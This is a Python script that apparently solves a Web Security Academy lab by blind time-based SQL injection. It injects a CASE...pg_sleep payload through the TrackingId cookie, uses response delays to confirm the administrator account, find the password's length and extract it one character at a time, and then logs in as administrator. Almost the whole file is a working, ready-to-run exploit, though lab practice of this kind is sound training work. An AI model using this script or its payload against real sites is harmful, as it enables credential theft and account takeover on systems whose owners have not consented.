import requests
import time
import re
import string
import sys

url = "https://0aa5006b03f0a6fe809ad51c002c003b.web-security-academy.net/"
session = "B9AHCMLxIV91NbvOX34z6ckhAT3B4cFO"
sleep_seconds = 10



# Helper Functions
def encode_cookie_value(condition):
    """
    Builds the TrackingId cookie exactly as in the instructions:
    x'%3BSELECT+CASE+WHEN+(condition)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    """
    return f"x'%3BSELECT+CASE+WHEN+({condition})+THEN+pg_sleep({sleep_seconds})+ELSE+pg_sleep(0)+END+FROM+users--"

def check_condition_with_sleep(condition):
    cookies = {
        "TrackingId": encode_cookie_value(condition),
        "session": session
    }
    start = time.time()
    try:
        requests.get(url, cookies=cookies, timeout=sleep_seconds + 5)
        elapsed = time.time() - start
        return elapsed >= sleep_seconds
    except requests.Timeout:
        return True

def get_csrf_token(session, url):
    resp = session.get(url)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
    return match.group(1) if match else None

def login_as_administrator(password):
    login_url = url + "login"
    session = requests.Session()
    csrf_token = get_csrf_token(session, login_url)
    login_data = {"username": "administrator", "password": password}
    if csrf_token:
        login_data["csrf"] = csrf_token
    resp = session.post(login_url, data=login_data)
    if "Your username is: administrator" in resp.text or "/my-account" in resp.url:
        print("[+] Login successful!")
        return True
    print("[-] Login failed.")
    return False

def test_delay():
    print("[*] Testing delay with 1=1 and 1=2...")
    true_delayed = check_condition_with_sleep("1=1")
    false_delayed = check_condition_with_sleep("1=2")
    if true_delayed and not false_delayed:
        print("[+] Delay works as expected.")
        return True
    else:
        print(f"[-] Delay test failed: 1=1 -> {true_delayed}, 1=2 -> {false_delayed}")
        return False

def verify_administrator():
    print("[*] Checking for administrator user...")
    condition = "username='administrator'"
    if check_condition_with_sleep(condition):
        print("[+] Administrator exists.")
        return True
    print("[-] Administrator not found.")
    return False

def find_password_length(max_len=30):
    print("[*] Finding password length...")
    length = 0
    for i in range(1, max_len+1):
        cond = f"username='administrator' AND LENGTH(password)>{i-1}"
        if check_condition_with_sleep(cond):
            length = i
            print(f"    → at least {length}")
        else:
            break
    print(f"[+] Password length = {length}")
    return length

def extract_password(length, charset=string.ascii_lowercase + string.digits):
    print(f"[*] Extracting {length}-character password...")
    password = ""
    for pos in range(1, length+1):
        found = False
        for ch in charset:
            cond = f"username='administrator' AND SUBSTRING(password,{pos},1)='{ch}'"
            if check_condition_with_sleep(cond):
                password += ch
                print(f"    Pos {pos:2d}: '{ch}' → {password}")
                found = True
                break
        if not found:
            print(f"[-] No character at pos {pos}")
            sys.exit(1)
    return password



# Final Execution Part
def main():
    print("=== PostgreSQL Time‑Based (CASE + pg_sleep) with URL-encoded cookie ===\n")
    if not test_delay():
        return
    if not verify_administrator():
        return
    pwd_len = find_password_length()
    if pwd_len == 0:
        return
    password = extract_password(pwd_len)
    print(f"\n[SUCCESS] Administrator password: {password}")
    print("[*] Logging in...")
    if login_as_administrator(password):
        print("\nLab solved")
    else:
        print(f"\nLogin failed.")

if __name__ == "__main__":
    main()